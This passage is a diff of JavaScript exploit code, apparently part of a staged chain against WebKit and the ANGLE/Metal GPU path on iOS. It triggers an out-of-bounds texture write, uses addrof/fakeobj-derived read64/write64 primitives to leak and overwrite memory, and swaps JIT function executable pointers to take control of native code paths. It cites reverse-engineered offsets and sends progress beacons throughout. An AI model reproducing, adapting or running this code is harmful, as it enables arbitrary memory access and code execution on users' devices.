+                    exploitState.gpuContextLost = true;
+                    evidence.gpuContextLost = true;
+                    log('  Context lost during trigger - GPU process instability observed', 'critical');
+                    beaconEvent('stage3_hit', `type=context_lost;attempt=${globalAttempt + 1}`);
+                    break;
+                }
+
+                if (oracleResult.scanResult.changed) {
+                    evidence.gpuHeapCorruption = true;
+                    evidence.angleCorruptionDetected = true;
+                    exploitState.gpuHeapCorruptions++;
+                    exploitState.lastGpuHeapHit = {
+                        attempt: globalAttempt + 1,
+                        config: cfg,
+                        mismatches: oracleResult.scanResult.mismatches,
+                    };
+                    const idxSummary = oracleResult.scanResult.mismatches.map(m => m.index).join(', ');
+                    log(`  Heap-oracle corruption detected! guard_indexes=[${idxSummary}]`, 'critical');
+                    for (const mismatch of oracleResult.scanResult.mismatches.slice(0, 4)) {
+                        log(
+                            `  guard[${mismatch.index}] ${mismatch.reason} expected=0x${mismatch.expectedHash.toString(16)} actual=0x${mismatch.actualHash.toString(16)}`,
+                            'critical'
+                        );
+                    }
+                    beaconEvent('stage3_hit', `type=heap_oracle;attempt=${globalAttempt + 1};mismatches=${oracleResult.scanResult.mismatches.length}`);
+                    break;
+                }
+
+                const snapshot = snapshotGPUCanaries(gl, harness);
+                if (!snapshot.ok) {
+                    log(`  Canary snapshot failed: ${snapshot.error}`, 'warn');
+                } else {
+                    const diff = diffGPUCanaries(harness.baseline, snapshot);
+                    if (diff.changed) {
+                        evidence.gpuCanaryCorruption = true;
+                        evidence.angleCorruptionDetected = true;
+                        log(`  GPU canary corruption detected! textures=${diff.textureMismatches.length}, pbos=${diff.pboMismatches.length}`, 'critical');
+                        if (diff.textureMismatches.length) {
+                            log(`  Texture canary indexes: ${diff.textureMismatches.join(', ')}`, 'critical');
+                        }
+                        if (diff.pboMismatches.length) {
+                            log(`  PBO canary indexes: ${diff.pboMismatches.join(', ')}`, 'critical');
+                        }
+                        beaconEvent('stage3_hit', `type=canary;attempt=${globalAttempt + 1};tex=${diff.textureMismatches.length};pbo=${diff.pboMismatches.length}`);
+                        break;
+                    }
+                }
+
+                await new Promise(r => setTimeout(r, 20));
+            }
+
+            if (evidence.angleCorruptionDetected || evidence.gpuContextLost) {
+                break;
+            }
+            if (budgetExpired) {
+                break;
+            }
+            await new Promise(r => setTimeout(r, 50));
+        }
+
+        exploitState.angleTriggered = anyTriggered;
+        exploitState.oobWriteSize = maxOob;
+        exploitState.stage3Complete = true;
+
+        if (!evidence.angleCorruptionDetected && !evidence.gpuContextLost) {
+            log('No heap-oracle or baseline-canary mismatch observed in this run', 'warn');
+        }
+
+        log(
+            `STAGE 3 COMPLETE: attempts=${exploitState.gpuTriggerAttempts}, max_oob=${maxOob}, heap_hits=${exploitState.gpuHeapCorruptions}`,
+            'stage3'
+        );
+        beaconEvent('stage3_end', `attempts=${exploitState.gpuTriggerAttempts};max_oob=${maxOob};evidence=${evidence.angleCorruptionDetected ? 1 : 0};ctxlost=${evidence.gpuContextLost ? 1 : 0};budget=${budgetExpired ? 1 : 0}`);
+        return anyTriggered;
+
+    } catch (e) {
+        log(`Stage 3 exception: ${e.message}`, 'fail');
+        log('Exception observed while executing ANGLE trigger path', 'critical');
+        evidence.angleTriggered = true;
+        evidence.gpuContextLost = gl.isContextLost();
+        evidence.angleCorruptionDetected = evidence.gpuContextLost;
+        exploitState.gpuContextLost = evidence.gpuContextLost;
+        exploitState.angleTriggered = true;
+        exploitState.stage3Complete = true;
+        beaconEvent('stage3_fail', `exception=${(e.message || 'unknown').slice(0, 120)}`);
+        return true;
+    }
+}
+
+function resetUnpackState(gl) {
+    gl.pixelStorei(gl.UNPACK_ALIGNMENT, 4);
+    gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 0);
+    gl.pixelStorei(gl.UNPACK_SKIP_PIXELS, 0);
+    gl.pixelStorei(gl.UNPACK_SKIP_ROWS, 0);
+    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 0);
+    gl.pixelStorei(gl.UNPACK_SKIP_IMAGES, 0);
+}
+
+function triggerANGLEDepthOOB(gl, cfg, seed) {
+    const width = cfg.width;
+    const height = cfg.height;
+    const unpackImageHeight = cfg.unpackImageHeight;
+    const useSubImage = cfg.useSubImage;
+
+    const rowPitch = width * 4; // DEPTH_COMPONENT/FLOAT
+    const allocatedSize = rowPitch * unpackImageHeight;
+    const actualWriteSize = rowPitch * height;
+    const oobWriteSize = Math.max(0, actualWriteSize - allocatedSize);
+    const sourceBytes = rowPitch * height;
+
+    // IDA verification (iOS 26.1 dyld cache):
+    // - GL_PixelStorei_0: pname 0x806E writes ctx+0x2D9C
+    // - gl::Context::texImage2D passes PixelUnpackState at ctx+0x2D8C
+    // - rx::TextureMtl::setSubImageImpl reads [PixelUnpackState + 0x10]
+    // Therefore [a7 + 0x10] == UNPACK_IMAGE_HEIGHT in the vulnerable path.
+
+    const pbo = gl.createBuffer();
+    const texture = gl.createTexture();
+    let err = gl.NO_ERROR;
+    let contextLost = false;
+
+    try {
+        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+        // Keep memory pressure manageable for large trigger profiles.
+        // ANGLE path only needs a correctly-sized PBO allocation.
+        if (sourceBytes <= 0x200000) {
+            const pboData = makePatternF32(width * height, seed);
+            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, pboData, gl.STATIC_DRAW);
+        } else {
+            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, sourceBytes, gl.STATIC_DRAW);
+        }
+
+        gl.bindTexture(gl.TEXTURE_2D, texture);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+
+        resetUnpackState(gl);
+        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);
+
+        if (useSubImage) {
+            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, null);
+            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+            gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, width, height, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
+        } else {
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
+        }
+
+        err = gl.getError();
+        gl.finish();
+        contextLost = gl.isContextLost();
+    } finally {
+        resetUnpackState(gl);
+        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
+        gl.bindTexture(gl.TEXTURE_2D, null);
+        if (texture) gl.deleteTexture(texture);
+        if (pbo) gl.deleteBuffer(pbo);
+    }
+
+    return { err, contextLost, oobWriteSize };
+}
+
+// =============================================================================
+// STAGE 4: Chain Integration Gate
+// =============================================================================
+//
+// Stage 4 marks the chain as "ready" only when BOTH conditions hold:
+//   1) WebKit renderer primitive evidence (addrof + fakeobj)
+//   2) GPU-process evidence (canary corruption or context loss after ANGLE path)
+// =============================================================================
+
+async function runStage4() {
+    log('\n========================================', 'stage3');
+    log('STAGE 4: Chain Integration Gate', 'stage3');
+    log('========================================', 'stage3');
+
+    const rendererPrims = evidence.addrofWorks && evidence.fakeobjWorks;
+    const gpuEvidence = evidence.angleCorruptionDetected || evidence.gpuContextLost;
+    const angleExecuted = evidence.angleTriggered;
+
+    log(`Renderer primitives: ${rendererPrims ? 'READY' : 'NOT READY'}`, rendererPrims ? 'success' : 'warn');
+    log(`ANGLE path executed: ${angleExecuted ? 'YES' : 'NO'}`, angleExecuted ? 'success' : 'warn');
+    log(`GPU evidence: ${gpuEvidence ? 'PRESENT' : 'ABSENT'}`, gpuEvidence ? 'critical' : 'warn');
+    log(`  heap-oracle=${evidence.gpuHeapCorruption ? 'hit' : 'none'}, canary=${evidence.gpuCanaryCorruption ? 'hit' : 'none'}, context_lost=${evidence.gpuContextLost ? 'yes' : 'no'}`, gpuEvidence ? 'critical' : 'warn');
+
+    if (!rendererPrims && exploitState.stage1Complete) {
+        log('Stage 1 ran but did not preserve stable primitive evidence in this run', 'warn');
+    }
+    if (!gpuEvidence && exploitState.stage3Complete) {
+        log('Stage 3 ran but no canary mismatch/context-loss was observed', 'warn');
+    }
+
+    evidence.chainReady = rendererPrims && angleExecuted && gpuEvidence;
+    exploitState.stage4Complete = true;
+
+    if (evidence.chainReady) {
+        log('CHAIN READY: Renderer + GPU-process evidence captured in one run', 'critical');
+    } else {
+        log('CHAIN NOT READY: Missing either renderer primitives or GPU-process evidence', 'warn');
+    }
+
+    logEvidenceSummary();
+    return evidence.chainReady;
+}
+
+// =============================================================================
+// STAGE 5: Live In-Process Read/Write Proof
+// =============================================================================
+//
+// Demonstrates practical post-primitive impact in-process on a live object:
+// 1) leak a secret token from raw memory using read64(addr)
+// 2) mutate that token in memory using write64(addr, val)
+// =============================================================================
+
+async function runStage5() {
+    log('\n========================================', 'stage3');
+    log('STAGE 5: Live In-Process R/W Proof', 'stage3');
+    log('========================================', 'stage3');
+    beaconEvent('stage5_start', 'runStage5');
+
+    if (!exploitState.stablePrimitivesReady ||
+        typeof exploitState.read64 !== 'function' ||
+        typeof exploitState.write64 !== 'function' ||
+        typeof exploitState.addrof !== 'function') {
+        log('Stage 5 failed: stable read64/write64 primitives unavailable', 'fail');
+        beaconEvent('stage5_end', 'read=0;write=0;reason=no_primitives');
+        return false;
+    }
+
+    try {
+        const CANONICAL_NAN = 0x7ff8000000000000n;
+        const SLOT0_OFF = 0x10n;
+        const staleStage1Addr = exploitState.leakedAddresses?.stage5Probe || 0n;
+
+        // Rotate the secret each run so stale reads cannot accidentally pass.
+        const nonce = BigInt((Date.now() ^ ((Math.random() * 0x100000000) >>> 0)) & 0xffff);
+        let secretWord = (0x1122334455660000n | nonce) ^ 0x55aan;
+        if (((secretWord >> 48n) & 0xffffn) === 0x7ff8n || secretWord === 0n) {
+            secretWord ^= 0x0100000000000001n;
+        }
+        stage5Probe.slot0 = itof(secretWord);
+
+        const jsBefore = ftoi(stage5Probe.slot0);
+        const addrofProbe = exploitState.addrof(stage5Probe);
+        const candidateAddrs = [];
+        if (addrofProbe !== 0n && addrofProbe !== CANONICAL_NAN) {
+            candidateAddrs.push({ source: 'addrof', addr: addrofProbe });
+        }
+        if (staleStage1Addr !== 0n && staleStage1Addr !== CANONICAL_NAN) {
+            candidateAddrs.push({ source: 'stage1_leak', addr: staleStage1Addr });
+        }
+        if (candidateAddrs.length === 0) {
+            throw new Error('no_stage5_candidates');
+        }
+
+        let selected = null;
+        const candidateNotes = [];
+        for (let i = 0; i < candidateAddrs.length; i++) {
+            const c = candidateAddrs[i];
+            let v = 0n;
+            try {
+                v = exploitState.read64(c.addr + SLOT0_OFF);
+            } catch (_) {
+                v = 0n;
+            }
+            const ok = (v === jsBefore) && (v !== CANONICAL_NAN);
+            candidateNotes.push(`${c.source}@0x${c.addr.toString(16)}=0x${v.toString(16)}:${ok ? 'ok' : 'bad'}`);
+            if (ok && selected === null) {
+                selected = { source: c.source, addr: c.addr, baseline: v };
+            }
+        }
+        if (selected === null) {
+            throw new Error(`no_live_address_${encodeURIComponent(candidateNotes.join('|').slice(0, 220))}`);
+        }
+
+        const liveAddr = selected.addr;
+        const slot0Addr = liveAddr + SLOT0_OFF;
+        const baselineWord = selected.baseline;
+
+        let writeMarkerWord = secretWord ^ 0x00ff00aa55aa00ffn;
+        if (writeMarkerWord === secretWord) {
+            writeMarkerWord ^= 0x1111n;
+        }
+        if (((writeMarkerWord >> 48n) & 0xffffn) === 0x7ff8n || writeMarkerWord === 0n) {
+            writeMarkerWord ^= 0x0100000000000000n;
+        }
+
+        exploitState.write64(slot0Addr, writeMarkerWord);
+        const markerRead = exploitState.read64(slot0Addr);
+        const jsMarker = ftoi(stage5Probe.slot0);
+
+        exploitState.write64(slot0Addr, secretWord);
+        const restoreRead = exploitState.read64(slot0Addr);
+        const jsRestore = ftoi(stage5Probe.slot0);
+
+        const baselineMatches = (baselineWord === secretWord) && (baselineWord === jsBefore) && (baselineWord !== CANONICAL_NAN);
+        const markerMatches = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord);
+        const restoreMatches = (restoreRead === secretWord) && (jsRestore === secretWord);
+        const readOk = baselineMatches && restoreMatches;
+        const writeOk = markerMatches && restoreMatches;
+        const movedFromStage1 = (staleStage1Addr !== 0n) && (staleStage1Addr !== liveAddr);
+        const leakedToken = `0x${baselineWord.toString(16)}`;
+
+        evidence.sensitiveDataRead = readOk && writeOk;
+        evidence.arbRWWorks = evidence.arbRWWorks || (readOk && writeOk);
+        exploitState.leakedSensitive = leakedToken;
+        exploitState.stage5Complete = readOk && writeOk;
+
+        log(`Stage5 probe base: 0x${liveAddr.toString(16)} (slot0=+0x10)`, 'critical');
+        log(`Stage5 source: ${selected.source}`, 'info');
+        log(`Stage5 candidates: ${candidateNotes.join(' | ')}`, 'info');
+        if (staleStage1Addr !== 0n) {
+            log(`Stage5 addr drift vs Stage1 leak: ${movedFromStage1 ? 'YES' : 'NO'} (stage1=0x${staleStage1Addr.toString(16)})`, movedFromStage1 ? 'warn' : 'success');
+        }
+        log(`Sensitive token leaked via read64: ${readOk ? 'YES' : 'NO'}`, readOk ? 'critical' : 'warn');
+        if (readOk) {
+            log(`Leaked token: ${leakedToken}`, 'critical');
+        }
+        log(`Sensitive token overwritten via write64: ${writeOk ? 'YES' : 'NO'}`, writeOk ? 'critical' : 'warn');
+        log(
+            `Verify base=0x${baselineWord.toString(16)} js_before=0x${jsBefore.toString(16)} marker_raw=0x${markerRead.toString(16)} js_marker=0x${jsMarker.toString(16)} restore_raw=0x${restoreRead.toString(16)} js_restore=0x${jsRestore.toString(16)}`,
+            (readOk && writeOk) ? 'critical' : 'warn'
+        );
+        beaconEvent(
+            'stage5_end',
+            `read=${readOk ? 1 : 0};write=${writeOk ? 1 : 0};live=${baselineMatches ? 1 : 0};marker_ok=${markerMatches ? 1 : 0};restore_ok=${restoreMatches ? 1 : 0};off=0x10;len=${leakedToken.length};base=0x${baselineWord.toString(16)};js_before=0x${jsBefore.toString(16)};marker=0x${markerRead.toString(16)};js_marker=0x${jsMarker.toString(16)};restore=0x${restoreRead.toString(16)};js_restore=0x${jsRestore.toString(16)};addr_live=0x${liveAddr.toString(16)};addr_src=${selected.source};addr_stage1=0x${staleStage1Addr.toString(16)};addr_shift=${movedFromStage1 ? 1 : 0};cands=${encodeURIComponent(candidateNotes.join('|').slice(0, 220))}`
+        );
+        return readOk && writeOk;
+    } catch (e) {
+        log(`Stage 5 failed: ${e.message}`, 'fail');
+        beaconEvent('stage5_end', `read=0;write=0;reason=exception_${encodeURIComponent((e.message || 'unknown').slice(0, 80))}`);
+        return false;
+    }
+}
+
+// =============================================================================
+// STAGE 6: Native Execution Proof (PC/Code Path Control)
+// =============================================================================
+//
+// Strategy:
+// 1) JIT two functions with different native behavior
+// 2) overwrite a likely executable field in function A with function B's value
+// 3) verify A executes B behavior, then restore
+// =============================================================================
+
+async function runStage6(options = {}) {
+    const quickMode = !!options.quick;
+    const quietMode = !!options.quiet;
+    const probeOnly = !!options.probeOnly;
+    const s6log = (msg, type = 'info') => {
+        if (!quietMode) log(msg, type);
+    };
+    if (evidence.nativeExecWorks && exploitState.nativeExecDetails && exploitState.nativeExecDetails.includes('mode=hot_swap')) {
+        exploitState.stage6Complete = true;
+        beaconEvent('stage6_end', `native=1;mode=reuse_hot_swap;${exploitState.nativeExecDetails}`);
+        return true;
+    }
+    s6log('\n========================================', 'stage3');
+    s6log('STAGE 6: Native Execution Proof', 'stage3');
+    s6log('========================================', 'stage3');
+    beaconEvent('stage6_start', `runStage6;quick=${quickMode ? 1 : 0};src=${options.source || 'default'}`);
+
+    if (!exploitState.stablePrimitivesReady ||
+        typeof exploitState.read64 !== 'function' ||
+        typeof exploitState.write64 !== 'function' ||
+        typeof exploitState.addrof !== 'function') {
+        s6log('Stage 6 failed: stable primitives unavailable', 'fail');
+        evidence.nativeExecWorks = false;
+        exploitState.stage6Complete = false;
+        beaconEvent('stage6_end', 'native=0;reason=no_primitives');
+        return false;
+    }
+
+    try {
+        const jitSwapA = preAllocatedTargets.stage6FuncA;
+        const jitSwapB = preAllocatedTargets.stage6FuncB;
+
+        for (let i = 0; i < (quickMode ? 8000 : 50000); i++) {
+            jitSwapA(i);
+            jitSwapB(i);
+        }
+
+        const testArg = 123456 | 0;
+        const beforeA = jitSwapA(testArg) | 0;
+        const beforeB = jitSwapB(testArg) | 0;
+        if (beforeA === beforeB) {
+            s6log('Stage 6 failed: JIT functions are not behavior-distinct', 'fail');
+            evidence.nativeExecWorks = false;
+            exploitState.stage6Complete = false;
+            beaconEvent('stage6_end', 'native=0;reason=no_behavior_delta');
+            return false;
+        }
+
+        const leakA = exploitState.leakedAddresses?.stage6FuncA || 0n;
+        const leakB = exploitState.leakedAddresses?.stage6FuncB || 0n;
+        const nowA = exploitState.addrof(jitSwapA);
+        const nowB = exploitState.addrof(jitSwapB);
+        let directA = 0n;
+        let directB = 0n;
+        try {
+            const ba = exploitState.boxedArray;
+            const ua = exploitState.unboxedArray;
+            if (ba && ua && ba.length > 0 && ua.length > 0) {
+                ba[0] = jitSwapA;
+                directA = ftoi(ua[0]);
+                ba[0] = jitSwapB;
+                directB = ftoi(ua[0]);
+            }
+        } catch (_) {}
+        const scanSamples = [];
+        let scannedA = 0n;
+        let scannedB = 0n;
+        const foundA = [];
+        const foundB = [];
+
+        // Recover real JSFunction cell addresses via fakeobj() neighborhood scan.
+        // We scan both leak neighborhoods for both behaviors to handle A/B drift.
+        if (!quickMode && typeof exploitState.fakeobj === 'function') {
+            const scanBases = [];
+            if (leakA !== 0n) scanBases.push({ base: leakA, label: 'LA' });
+            if (leakB !== 0n) scanBases.push({ base: leakB, label: 'LB' });
+            if (nowA !== 0n) scanBases.push({ base: nowA, label: 'NA' });
+            if (nowB !== 0n) scanBases.push({ base: nowB, label: 'NB' });
+            const addHit = (arr, v) => {
+                if (arr.length >= 16) return;
+                if (!arr.some(x => x === v)) arr.push(v);
+            };
+            const scanRadius = quickMode ? 0x2000n : 0x8000n;
+            const scanStep = quickMode ? 0x10n : 0x8n;
+            for (const b of scanBases) {
+                for (let d = -scanRadius; d <= scanRadius; d += scanStep) {
+                    const probe = b.base + d;
+                    try {
+                        const obj = exploitState.fakeobj(probe);
+                        if (typeof obj !== 'function') continue;
+                        let out = 0;
+                        try { out = obj(testArg) | 0; } catch (_) { continue; }
+                        if (scanSamples.length < 12) {
+                            scanSamples.push(`${b.label}${d >= 0n ? '+' : ''}0x${d.toString(16)}=>${out}`);
+                        }
+                        if (out === beforeA) addHit(foundA, probe);
+                        if (out === beforeB) addHit(foundB, probe);
+                    } catch (_) {}
+                }
+            }
+            if (foundA.length && foundB.length) {
+                outer:
+                for (const a of foundA) {
+                    for (const b of foundB) {
+                        if (a !== b) {
+                            scannedA = a;
+                            scannedB = b;
+                            break outer;
+                        }
+                    }
+                }
+            }
+        }
+
+        const sourcePairs = [];
+        const EXECUTABLE_FIELD_OFF = 0x18n; // IDA: JSFunction::getCallData loads [this + 0x18]
+        const baseDeltas = quickMode
+            ? [-0x20n, -0x10n, -0x8n, 0x0n, 0x8n, 0x10n, 0x18n, 0x20n]
+            : [
+                -0x100n, -0x80n, -0x60n, -0x40n, -0x30n, -0x20n, -0x18n, -0x10n, -0x8n,
+                0x0n,
+                0x8n, 0x10n, 0x18n, 0x20n, 0x30n, 0x40n, 0x60n, 0x80n, 0x100n
+            ];
+        const addSourcePairSet = (label, a0, b0) => {
+            for (const d of baseDeltas) {
+                sourcePairs.push({
+                    source: `${label}${d >= 0n ? '_p' : '_m'}0x${(d >= 0n ? d : -d).toString(16)}`,
+                    a: a0 + d,
+                    b: b0 + d
+                });
+            }
+        };
+        // Prefer leak-time addresses; current addrof can collapse after GC churn.
+        if (!quickMode && foundA.length && foundB.length) {
+            for (let i = 0; i < Math.min(foundA.length, 6); i++) {
+                for (let j = 0; j < Math.min(foundB.length, 6); j++) {
+                    if (foundA[i] === foundB[j]) continue;
+                    sourcePairs.push({ source: `scan_hit_${i}_${j}`, a: foundA[i], b: foundB[j] });
+                }
+            }
+        }
+        if (!quickMode && scannedA !== 0n && scannedB !== 0n) addSourcePairSet('scan', scannedA, scannedB);
+        if (leakA !== 0n && leakB !== 0n) addSourcePairSet('leak', leakA, leakB);
+        if (directA !== 0n && directB !== 0n) addSourcePairSet('direct', directA, directB);
+        if (nowA !== 0n && nowB !== 0n) addSourcePairSet('addrof', nowA, nowB);
+
+        const canScoreWord = (w) => w !== 0n && w !== 0x7ff8000000000000n;
+        let bestPair = null;
+        const scoreOffsets = [0x8n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n, 0x38n, 0x40n];
+
+        for (const p of sourcePairs) {
+            if (p.a === p.b) continue;
+            let nonNan = 0;
+            let diffs = 0;
+            for (const off of scoreOffsets) {
+                const va = exploitState.read64(p.a + off);
+                const vb = exploitState.read64(p.b + off);
+                if (canScoreWord(va) || canScoreWord(vb)) nonNan++;
+                if (va !== vb) diffs++;
+            }
+            const score = (nonNan * 100) + diffs;
+            if (!bestPair || score > bestPair.score) {
+                bestPair = { ...p, score, nonNan, diffs };
+            }
+        }
+
+        let addrA = bestPair ? bestPair.a : leakA;
+        let addrB = bestPair ? bestPair.b : leakB;
+        let addrSource = bestPair ? bestPair.source : 'leak';
+        let eqInfo = 'eq=na';
+        if (typeof exploitState.fakeobj === 'function') {
+            const checkEq = (label, addr) => {
+                if (addr === 0n) return `${label}:none`;
+                try {
+                    const o = exploitState.fakeobj(addr);
+                    return `${label}:A${o === jitSwapA ? 1 : 0}B${o === jitSwapB ? 1 : 0}T${typeof o}`;
+                } catch (_) {
+                    return `${label}:err`;
+                }
+            };
+            eqInfo = [
+                checkEq('leakA', leakA),
+                checkEq('leakB', leakB),
+                checkEq('nowA', nowA),
+                checkEq('nowB', nowB),
+            ].join(',');
+        }
+        const addrDebug = `leakA=0x${leakA.toString(16)};leakB=0x${leakB.toString(16)};directA=0x${directA.toString(16)};directB=0x${directB.toString(16)};scanA=0x${scannedA.toString(16)};scanB=0x${scannedB.toString(16)};foundA=${foundA.slice(0,4).map(v=>`0x${v.toString(16)}`).join(',')};foundB=${foundB.slice(0,4).map(v=>`0x${v.toString(16)}`).join(',')};nowA=0x${nowA.toString(16)};nowB=0x${nowB.toString(16)};${eqInfo}${bestPair ? `;score=${bestPair.score};nonNan=${bestPair.nonNan};diffs=${bestPair.diffs}` : ''};scan_samples=${scanSamples.join('|')}`;
+
+        if (bestPair) {
+            s6log(`Stage 6 address scoring: source=${bestPair.source} score=${bestPair.score} nonNan=${bestPair.nonNan} diffs=${bestPair.diffs}`, 'info');
+        }
+
+        if (addrA === 0n || addrB === 0n || addrA === addrB) {
+            evidence.nativeExecWorks = false;
+            exploitState.stage6Complete = false;
+            exploitState.nativeExecDetails = `beforeA=${beforeA};beforeB=${beforeB};addrA=0x${addrA.toString(16)};addrB=0x${addrB.toString(16)};same_addr=1;source=${addrSource};${addrDebug}`;
+            s6log('Stage 6 failed: function addresses collapsed (A == B)', 'fail');
+            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
+            return false;
+        }
+
+        // Targeted executable pointer swap first, using IDA-confirmed offset.
+        // First try JSValue slot copy to avoid read64()/itof() NaN canonicalization.
+        let targetedJsValueHit = null;
+        for (const p of sourcePairs) {
+            if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
+            const h = attemptHotNativeSwapBySlotCopy(p.a, p.b, jitSwapA, jitSwapB);
+            if (h.ok) {
+                targetedJsValueHit = { source: p.source, ...h };
+                break;
+            }
+        }
+        if (targetedJsValueHit) {
+            const details = `mode=exec_off_0x18_slotcopy;source=${targetedJsValueHit.source};fieldA=0x${targetedJsValueHit.fieldA.toString(16)};fieldB=0x${targetedJsValueHit.fieldB.toString(16)};donorType=${targetedJsValueHit.donorType || 'unknown'};beforeA=${targetedJsValueHit.beforeA};beforeB=${targetedJsValueHit.beforeB};swapped=${targetedJsValueHit.swapped};restored=${targetedJsValueHit.restored};w0=${targetedJsValueHit.w0};w1=${targetedJsValueHit.w1};w2=${targetedJsValueHit.w2};w3=${targetedJsValueHit.w3};${addrDebug}`;
+            evidence.nativeExecWorks = true;
+            exploitState.stage6Complete = true;
+            exploitState.nativeExecDetails = details;
+            s6log('Native execution proof: SUCCESS (direct executable field slot-copy @ +0x18)', 'critical');
+            s6log(`Native proof details: ${details}`, 'critical');
+            beaconEvent('stage6_end', `native=1;${details}`);
+            return true;
+        }
+
+        const targetedSamples = [];
+        let firstExecDiff = null;
+        let targetedHit = null;
+        for (const p of sourcePairs) {
+            if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
+            const fieldAddrA = p.a + EXECUTABLE_FIELD_OFF;
+            const fieldAddrB = p.b + EXECUTABLE_FIELD_OFF;
+            const execA = exploitState.read64(fieldAddrA);
+            const execB = exploitState.read64(fieldAddrB);
+            if (targetedSamples.length < 8) {
+                targetedSamples.push(`src=${p.source};a=0x${execA.toString(16)};b=0x${execB.toString(16)}`);
+            }
+            if (execA === 0n || execB === 0n || execA === execB) continue;
+            if (execA === 0x7ff8000000000000n || execB === 0x7ff8000000000000n) continue;
+            if (!firstExecDiff) {
+                firstExecDiff = {
+                    source: p.source,
+                    fieldAddrA,
+                    fieldAddrB,
+                    execA,
+                    execB
+                };
+            }
+            if (probeOnly) continue;
+            try {
+                exploitState.write64(fieldAddrA, execB);
+                const swapped = jitSwapA(testArg) | 0;
+                exploitState.write64(fieldAddrA, execA);
+                const restored = jitSwapA(testArg) | 0;
+                if (swapped === beforeB && restored === beforeA) {
+                    targetedHit = {
+                        source: p.source,
+                        fieldAddrA,
+                        fieldAddrB,
+                        execA,
+                        execB,
+                        swapped,
+                        restored
+                    };
+                    break;
+                }
+            } catch (e) {
+                try { exploitState.write64(fieldAddrA, execA); } catch (_) {}
+            }
+        }
+
+        if (probeOnly) {
+            evidence.nativeExecWorks = false;
+            exploitState.stage6Complete = false;
+            exploitState.nativeExecDetails = firstExecDiff
+                ? `probe_only=1;source=${firstExecDiff.source};fieldA=0x${firstExecDiff.fieldAddrA.toString(16)};fieldB=0x${firstExecDiff.fieldAddrB.toString(16)};execA=0x${firstExecDiff.execA.toString(16)};execB=0x${firstExecDiff.execB.toString(16)};beforeA=${beforeA};beforeB=${beforeB};${addrDebug};exec_samples=${targetedSamples.join('|')}`
+                : `probe_only=1;beforeA=${beforeA};beforeB=${beforeB};${addrDebug};exec_samples=${targetedSamples.join('|')}`;
+            beaconEvent('stage6_end', `native=0;${exploitState.nativeExecDetails}`);
+            return false;
+        }
+
+        if (targetedHit) {
+            const details = `mode=exec_off_0x18;source=${targetedHit.source};fieldA=0x${targetedHit.fieldAddrA.toString(16)};fieldB=0x${targetedHit.fieldAddrB.toString(16)};execA=0x${targetedHit.execA.toString(16)};execB=0x${targetedHit.execB.toString(16)};beforeA=${beforeA};beforeB=${beforeB};swapped=${targetedHit.swapped};restored=${targetedHit.restored};${addrDebug}`;
+            evidence.nativeExecWorks = true;
+            exploitState.stage6Complete = true;
+            exploitState.nativeExecDetails = details;
+            s6log('Native execution proof: SUCCESS (direct executable field swap @ +0x18)', 'critical');
+            s6log(`Native proof details: ${details}`, 'critical');
+            beaconEvent('stage6_end', `native=1;${details}`);
+            return true;
+        }
+
+        // Fallback: copy raw JSValue payloads across candidate fields via fakeobj().
+        // This bypasses ftoi()/itof() canonicalization when read64() collapses to NaN.
+        const jsValueSamples = [];
+        const jsValueOffsets = [];
+        for (let off = 0x8n; off <= 0x180n; off += 0x8n) {
+            jsValueOffsets.push(off);
+        }
+        const jsValueInlineOff = 0x10n;
+        let jsValueHit = null;
+        if (typeof exploitState.fakeobj === 'function') {
+            for (const p of sourcePairs) {
+                if (p.a === 0n || p.b === 0n || p.a === p.b) continue;
+                for (const off of jsValueOffsets) {
+                    const slotBaseA = p.a + off - jsValueInlineOff;
+                    const slotBaseB = p.b + off - jsValueInlineOff;
+                    try {
+                        const fakeDst = exploitState.fakeobj(slotBaseA);
+                        const fakeSrc = exploitState.fakeobj(slotBaseB);
+                        const origVal = fakeDst.slot0;
+                        const donorVal = fakeSrc.slot0;
+                        if (jsValueSamples.length < 8) {
+                            jsValueSamples.push(`src=${p.source};off=0x${off.toString(16)};t=${typeof donorVal}`);
+                        }
+                        if (typeof donorVal === 'undefined' || donorVal === null) {
+                            continue;
+                        }
+                        fakeDst.slot0 = donorVal;
+                        const swapped = jitSwapA(testArg) | 0;
+                        fakeDst.slot0 = origVal;
+                        const restored = jitSwapA(testArg) | 0;
+                        if (swapped === beforeB && restored === beforeA) {
+                            jsValueHit = { source: p.source, off, swapped, restored, donorType: typeof donorVal };
+                            break;
+                        }
+                    } catch (e) {
+                        // Ignore and continue probing.
+                    }
+                }
+                if (jsValueHit) break;
+            }
+        }
+
+        if (jsValueHit) {
+            const details = `mode=jsvalue_copy;source=${jsValueHit.source};off=0x${jsValueHit.off.toString(16)};type=${jsValueHit.donorType};beforeA=${beforeA};beforeB=${beforeB};swapped=${jsValueHit.swapped};restored=${jsValueHit.restored};${addrDebug}`;
+            evidence.nativeExecWorks = true;
+            exploitState.stage6Complete = true;
+            exploitState.nativeExecDetails = details;
+            s6log('Native execution proof: SUCCESS (JSValue field copy fallback)', 'critical');
+            s6log(`Native proof details: ${details}`, 'critical');
+            beaconEvent('stage6_end', `native=1;${details}`);
+            return true;
+        }
+
+        const allDiffs = [];
+        const pointerishOffsets = [];
